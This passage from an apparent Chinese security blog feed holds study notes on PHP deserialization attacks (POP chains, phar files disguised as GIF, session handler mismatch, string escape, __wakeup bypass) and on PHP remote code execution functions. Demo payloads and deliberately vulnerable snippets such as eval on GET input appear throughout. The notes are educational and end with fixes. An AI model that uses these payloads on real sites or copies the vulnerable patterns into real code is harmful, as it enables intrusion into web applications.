class="variable">$func2_test</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;func2_test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> = <span class="keyword">new</span> <span class="title function_ invoke__">demo</span>();</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:4:&quot;demo&quot;:1:&#123;s:9:&quot;demo_test&quot;;O:5:&quot;func2&quot;:1:&#123;s:10:&quot;func2_test&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>传入 payload：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/1.png"></p><h3 id="POP链"><a href="#POP链" class="headerlink" title="POP链"></a>POP链</h3><p>​POP(Property-Oriented Programing) 面向属性编程。根据上层语言构造特定调用链，从现有运行环境中寻找一系列代码，然后根据需求构成一组连续的调用链，达到攻击者的目的。</p><h2 id="phar反序化"><a href="#phar反序化" class="headerlink" title="phar反序化"></a>phar反序化</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>​<code>.phar</code> 后缀的文件是一种压缩文件，以序列化的形式存储用户自定义的 meta-data 。</p><p>​注意需要将 php.ini 中的 phar.readonly 设置为 Off，否则无法生成 phar 文件。</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/2.png"></p><p>​运行以下代码，将在同一文件夹下生成 phar.phar 文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;data = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>stub：可以理解为 phar 文件的标志。其实就是一个 PHP 文件，必须以 <code>__HALT_COMPILER();</code> 或 <code>__HALT_COMPILER();?&gt;</code> 结尾。</li><li>addFromString(“localname”, “contents”)：localname 压缩文件将存储在 phar 文件中的路径，contents 要存储的文件内容。这两个在你的计算机中是可以不存在的。</li></ul><p>​查看生成的 phar 文件：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/3.png"></p><p>​PHP 一大部分的文件系统函数在通过 phar:&#x2F;&#x2F; 伪协议解析 phar 文件时，都会将 meta-data 反序列化，受影响的函数如下：</p><table><thead><tr><th align="left">受影响的函数列表</th><th align="left"></th><th align="left"></th><th></th></tr></thead><tbody><tr><td align="left">fileatime</td><td align="left">filectime</td><td align="left">file_exists</td><td>file_get_contents</td></tr><tr><td align="left">file_put_contents</td><td align="left">file</td><td align="left">filegroup</td><td>fopen</td></tr><tr><td align="left">fileinode</td><td align="left">filemtime</td><td align="left">fileowner</td><td>fikeperms</td></tr><tr><td align="left">is_dir</td><td align="left">is_executable</td><td align="left">is_file</td><td>is_link</td></tr><tr><td align="left">is_readable</td><td align="left">is_writable</td><td align="left">is_writeable</td><td>parse_ini_file</td></tr><tr><td align="left">copy</td><td align="left">unlink</td><td align="left">stat</td><td>readfile</td></tr></tbody></table><p>​测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//输出：hello</span></span><br></pre></td></tr></table></figure><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>​已知 PHP 识别 phar 文件是通过识别 stub 是否存在，确切的说是 <code>__HALT_COMPILER();</code> 或 <code>__HALT_COMPILER();?&gt;</code>，对 stub 前面的内容及后缀名是否是 .phar 没有要求。</p><p>​基于上面的例子，我们改为 <code>setStub(&quot;GIF89a&lt;?php __HALT_COMPILER();?&gt;&quot;)</code> 、 <code>$o-&gt;data=phpinfo();</code> 。如果将 phar.phar 改为 phar.gif ，则可以绕过某些文件上传的检测，配合其他漏洞可能获得 shell 。</p><h2 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>session.save_path</td><td>session保存路径</td></tr><tr><td>session.serialize_handler</td><td>session序列化存储所用处理器，默认为php</td></tr><tr><td>session.use_trans_sid</td><td>指定是否启用透明SID支持，默认为0（禁用）。通俗的说，当值为1时，只要浏览器不关闭，同一域名下的不同页面将使用同一个session文件</td></tr></tbody></table><p>session.serialize_hanlder 的参数值：</p><table><thead><tr><th>处理器名称</th><th>存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名|键值序列化的结果</td></tr><tr><td>php_binary</td><td>键名长度对应的ASCII字符(+)键名(+)键值序列化的结果</td></tr><tr><td>php_serialize</td><td>将键-值做为数组的键-值，然后序列化处理该数组的结果</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//$_SESSION[&#x27;name&#x27;] = &quot;Tom&quot;;</span></span><br><span class="line"><span class="comment">#php</span></span><br><span class="line">name|s:<span class="number">3</span>:<span class="string">&quot;Tom&quot;</span></span><br><span class="line"><span class="comment">#php_binary</span></span><br><span class="line">names:<span class="number">3</span>:<span class="string">&quot;Tom&quot;</span> <span class="comment">//ascii中4是保留字符，无法显示</span></span><br><span class="line"><span class="comment">#php_serialize</span></span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;Tom&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h3><p>​如果 PHP 在序列化存储 session 数据时使用的处理器和反序列化时使用的处理器不一样，会导致数据无法正确地反序列化。</p><p>​如 <code>$_SESSION[&#39;hello&#39;] = &#39;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#39;;</code> ，在存储时使用的处理器为 php_serialize，则将存储为 <code>a:1:&#123;s:5:&quot;hello&quot;;s:19:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</code> 。如果在读取数据时如果使用的反序列化处理器是 php ，那么反序列化后的数据将会变成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;a:1:&#123;s:5:&quot;</span>hello<span class="string">&quot;;s:20:&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(<span class="built_in">stdClass</span>)<span class="comment">#1 (0) &#123;&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">object(stdClass)#1 (0) &#123;&#125; 表示这是一个stdClass类的对象，#1表示是脚本中创建的第一个此类对象，(0)表示这个对象没有任何属性</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>​原本应该反序列化为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;hello&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">20</span>) <span class="string">&quot;|O:8:&quot;</span><span class="built_in">stdClass</span><span class="string">&quot;:0:&#123;&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​实际中，当 session.auto_start&#x3D;On 时，将自动开启 session 会话（相当于执行了session_start()）。因为该过程发生在 PHP 代码执行前，所以在代码中将要设定的 session 相关配置是不起作用的，因此一些需要在代码中设置 session 序列化处理器的程序会先销毁自动生成的 session 会话，然后设置 session 序列化处理器，再调用 session_start() 开启 session 会话。如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;session.auto_start&#x27;</span>)==<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="comment">//some codes</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h1><p>​PHP 在反序列化时，以 <code>;</code> 作为分隔符，<code>&#125;</code> 作为结束符（字符串里的除外），并且根据长度判断内容 。反序列化过程中必须严格按照序列化规则才能成功反序列化 。</p><h2 id="字符增多"><a href="#字符增多" class="headerlink" title="字符增多"></a>字符增多</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/p/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>, <span class="string">&quot;WW&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="number">24</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">array</span>(<span class="variable">$username</span>, <span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;替换前，序列化：&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="variable">$r</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)); <span class="comment">//替换</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;进行替换后：&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;替换后，反序列化：&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$r</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>username 中没有 p 时，一切正常：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/6.png"></p><p>如果有 p ，一个 p 将替换为 ww ，字符增多，不符合严格的序列化规则，将报错：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/7.png"></p><p>如果想把年龄修改为 18 ，那么可以通过构造 username 的值来使得 age 改变：</p><ol><li><p>构造 age 为 18 时的序列化结果 <code>&quot;;i:1;i:18;&#125;</code> ，前面的 <code>&quot;</code> 是为了闭合前一个元素 username 的值，最后的 <code>&#125;</code> 是为了闭合整个序列化字符串，抛弃后面的内容。</p></li><li><p>数一下上面构造的内容有多少个字符，这里有 12 个，因此通过 filter() 替换后需要变多 12 个字。由于一个 p 会变成 2 个 w 字符，即每一个 p 替换后会多出一个字符，所以这里需要 12 个 p 。</p></li><li><p>payload：<code>?username=pppppppppppp&quot;;i:1;i:18;&#125;</code></p></li></ol><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/8.png"></p><h2 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/xx/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>, <span class="string">&#x27;s&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">array</span>(<span class="variable">$username</span>, <span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;替换前，序列化：&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="variable">$r</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)); <span class="comment">//替换</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;进行替换后：&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;替换后，反序列化：&quot;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$r</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果想在数组里插入一个值 <code>hello</code> （序列化结果为 <code>s:5:&quot;hello&quot;;&#125;</code> ），那么只能将 age 吞噬。</p><p>payload：<code>?username=maasxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=a&quot;;i:1;s:5:&quot;hello&quot;;&#125;</code> 。</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/PHPunserialize/9.png"></p><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="16进制编码"><a href="#16进制编码" class="headerlink" title="16进制编码"></a>16进制编码</h2><p>​将序列化字符串的 s 改为大写 S ，反序列化时就会解析 16 进制数据。如：<code>O:4:&quot;Test&quot;:1:&#123;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code> ，可改为 <code>O:4:&quot;Test&quot;:1:&#123;S:3:&quot;\x63md&quot;;S:6:&quot;\x77hoami&quot;;&#125;</code> 。</p><h2 id="利用wakeup-函数的特点"><a href="#利用wakeup-函数的特点" class="headerlink" title="利用wakeup()函数的特点"></a>利用wakeup()函数的特点</h2><p>​如果序列化字符串中表示变量个数的值大于真实的变量个数时会跳过 __wakeup 的执行。</p><p>​影响版本：PHP5 &lt; 5.6.25，PHP7 &lt; 7.0.10 。</p><h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><ol><li>严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能。</li><li>对可能产生危害的地方的属性的值进行严格的过滤。</li><li>加固文件上传模块的防护，防止触发 phar 反序列化漏洞。</li><li>设置 session_use_trans_sid&#x3D;0 ，禁止跨页面访问 session 。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;函数&quot;&gt;&lt;a href=&quot;#函数&quot; class=&quot;headerlink&quot; title=&quot;函数&quot;&gt;&lt;/a&gt;函数&lt;/h1&gt;&lt;h2 id=&quot;序列-反序列化函数&quot;&gt;&lt;a href=&quot;#序列-反序列化函数&quot; class=&quot;headerlink&quot; title=&quot;序列&amp;#x2F</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>RCE漏洞学习</title>
    <link href="http://example.com/2023/12/17/RCE/"/>
    <id>http://example.com/2023/12/17/RCE/</id>
    <published>2023-12-16T16:00:00.000Z</published>
    <updated>2023-12-18T05:30:30.937Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​RCE，Remote Command&#x2F;Code Execute，远程命令&#x2F;代码执行。</p><h1 id="命令拼接符"><a href="#命令拼接符" class="headerlink" title="命令拼接符"></a>命令拼接符</h1><blockquote><p>注意，通过 url 传入命令时，拼接符需要进行 url 编码。</p></blockquote><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="命令1-命令2"><a href="#命令1-命令2" class="headerlink" title="命令1 || 命令2"></a>命令1 || 命令2</h3><p>​命令 1 执行成功，则不执行命令 2 ；命令 1 执行失败，则执行命令 2 。</p><h3 id="命令1-命令2-1"><a href="#命令1-命令2-1" class="headerlink" title="命令1 | 命令2"></a>命令1 | 命令2</h3><p>​命令 1 执行成功，则执行命令 2 ，仅显示命令 2 的执行结果；命令 1 执行失败，则不执行命令 2 。</p><h3 id="命令1-命令2-2"><a href="#命令1-命令2-2" class="headerlink" title="命令1 &amp;&amp; 命令2"></a>命令1 &amp;&amp; 命令2</h3><p>​命令 1 执行成功，则执行命令 2 ，两个命令的执行结果都输出；命令 1 执行失败，则不执行命令 2 。</p><h3 id="命令1-命令2-3"><a href="#命令1-命令2-3" class="headerlink" title="命令1 &amp; 命令2"></a>命令1 &amp; 命令2</h3><p>​命令 1、2 一起执行，互不影响。</p><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="命令1-命令2-4"><a href="#命令1-命令2-4" class="headerlink" title="命令1 ; 命令2"></a>命令1 ; 命令2</h3><p>​命令 1、2 依次执行，互不影响。</p><h3 id="命令1-命令2-5"><a href="#命令1-命令2-5" class="headerlink" title="命令1 | 命令2"></a>命令1 | 命令2</h3><p>​管道符，命令 1 的执行结果做为命令 2 的输入。</p><p>​命令 1 执行成功，则执行命令 2 ，仅显示命令 2 的执行结果；命令 1 执行失败，则不执行命令 2 。</p><h3 id="命令1-命令2-6"><a href="#命令1-命令2-6" class="headerlink" title="命令1 || 命令2"></a>命令1 || 命令2</h3><p>​命令 1 执行成功，则不执行命令 2 ；命令 1 执行失败，则执行命令 2 。</p><h3 id="命令1-命令2-7"><a href="#命令1-命令2-7" class="headerlink" title="命令1 &amp;&amp; 命令2"></a>命令1 &amp;&amp; 命令2</h3><p>​命令 1 执行成功，则执行命令 2 ，两个命令的执行结果都输出；命令 1 执行失败，则不执行命令 2 。</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h3><p>​把字符串按照 PHP 代码来执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">phpinfo</span>()); <span class="comment">//可以</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">phpinfo</span>();); <span class="comment">//报错</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;phpinfo();&quot;</span>); <span class="comment">//可以</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;phpinfo()&quot;</span>); <span class="comment">//报错</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=phpinfo(); 分号必须有</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>); <span class="comment">//此处及其他类似这样的变量用法，PHP会自动在变量的替代内容外包裹引号</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>​如果是字符串将会被当作 PHP 代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">phpinfo</span>()); <span class="comment">//可以</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="title function_ invoke__">phpinfo</span>();); <span class="comment">//报错</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;phpinfo()&quot;</span>); <span class="comment">//可以</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;phpinfo();&quot;</span>); <span class="comment">//可以</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=phpinfo(); 分号可有可无</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br></pre></td></tr></table></figure><p>​执行一个正则表达式的搜索和替换。</p><p>​$pattern 为正则表达式，$subject 为目标字符串，将匹配到的部分用 $replacement 替换。</p><p>​当 $pattern 处出现 <code>/e</code> 修正符，$replacement 会被当作 PHP 代码执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=phpinfo(); 分号可有可无</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>], <span class="string">&quot;jutst test&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(函数a, xxx)</span><br></pre></td></tr></table></figure><p>​调用函数 a ，xxx 为函数 a 的参数。</p><p>​经测试，只有 assert 可以，eval 不行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//?cmd=phpinfo(); 分号可有可无</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(assert, <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="system-和-passthru"><a href="#system-和-passthru" class="headerlink" title="system() 和 passthru()"></a>system() 和 passthru()</h3><p>​执行操作系统命令，仅当执行成功时输出执行结果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system/<span class="title function_ invoke__">passthru</span>(<span class="string">&quot;命令&quot;</span>); <span class="comment">//标准写法</span></span><br><span class="line">system/<span class="title function_ invoke__">passthru</span>(命令); <span class="comment">//可以，但会抛出错误</span></span><br><span class="line">(system/passthru)(<span class="string">&quot;命令&quot;</span>); <span class="comment">//可以，但会抛出错误</span></span><br><span class="line">(system/passthru)(命令); <span class="comment">//可以，但会抛出错误</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 